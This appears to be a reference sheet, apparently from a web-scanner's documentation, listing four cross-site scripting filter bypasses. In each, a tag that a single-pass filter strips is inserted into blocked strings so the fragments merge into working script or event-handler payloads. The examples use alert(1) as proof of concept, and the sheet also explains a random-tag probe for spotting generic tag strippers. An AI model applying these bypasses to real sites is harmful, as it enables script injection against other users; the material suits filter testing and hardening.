1. XSS with Script Tag Removed (Nested Payload)
- Payload: <scr<REMOVED>ipt>alert(1)</scr<REMOVED>ipt>
- Condition: Input is reflected into HTML where the filter removes <script> tags but does NOT encode angle brackets (< >)
- Case: The filter detects and removes <script>...</script> patterns. By nesting <script> inside another, when the filter removes <script>, the fragments merge into a valid <script> tag. After removal: <script>alert(1)</script>
- Output: <scr<REMOVED>ipt>alert(1)</scr<REMOVED>ipt> → filter removes <REMOVED> → result: <script>alert(1)</script>

---

2. XSS with Removed Tag as Splitter to Reconstruct Blocked Content (General)
- Payload: <s<REMOVED>vg onload=a<REMOVED>lert(1)>
- Condition: Input is reflected into HTML where the filter removes a specific tag (e.g. <script>, <svg>, <img>, etc.) but does NOT encode angle brackets (< >), AND any part of the payload is also blocked/filtered
- Case: Whatever tag the filter removes, use that SAME removed tag as a splitter inside ANY blocked content. When the filter removes the tag, the fragments on either side merge back together, reconstructing the blocked content. This works for:
  * Blocked tag names: <s<REMOVED>vg> → removes <REMOVED> → <svg>
  * Blocked keywords: a<REMOVED>lert → removes <REMOVED> → alert
  * Blocked functions: prom<REMOVED>pt → removes <REMOVED> → prompt
  * Blocked event handlers: on<REMOVED>error → removes <REMOVED> → onerror
  * Any blocked string: split it with the removed tag and it reconstructs after filtering
- Output: <s<REMOVED>vg onload=a<REMOVED>lert(1)> → filter removes all <REMOVED> → result: <svg onload=alert(1)>

---

3. XSS with Removed Tag as Splitter — Multiple Blocked Parts
- Payload: <s<REMOVED>vg on<REMOVED>load=a<REMOVED>lert(1)>
- Condition: Input is reflected into HTML where the filter removes a specific tag but does NOT encode angle brackets (< >), AND multiple parts of the payload are blocked (tag name, event handler, and function name)
- Case: Insert the removed tag into EVERY blocked part of the payload. The filter removes all instances of the tag, and all fragments merge back into the complete original payload
- Output: <s<REMOVED>vg on<REMOVED>load=a<REMOVED>lert(1)> → filter removes all <REMOVED> → result: <svg onload=alert(1)>

---

4. Random-Tag Probe — Detecting a Generic Tag-Stripper
- Probe: <xDh> (a random 3-letter tag regenerated on every --probe2 run, reported as "rand_tag")
- Condition: rand_tag FAILs with an empty reflection — the filter deletes even a tag it has never seen
- Case: a filter that removes arbitrary <...> tags is a generic tag-stripper, so the SAME random tag works as a universal splitter for any blocked content. If the random tag survives but <script> is removed, the filter is a specific-tag stripper and only <script> itself can act as splitter. Caveat: the bypass only works against single-pass removal — a filter that loops until no match remains will strip the merged result too
- Output: <scr<xDh>ipt>alert(1)</scr<xDh>ipt> → filter removes <xDh> → result: <script>alert(1)</script>
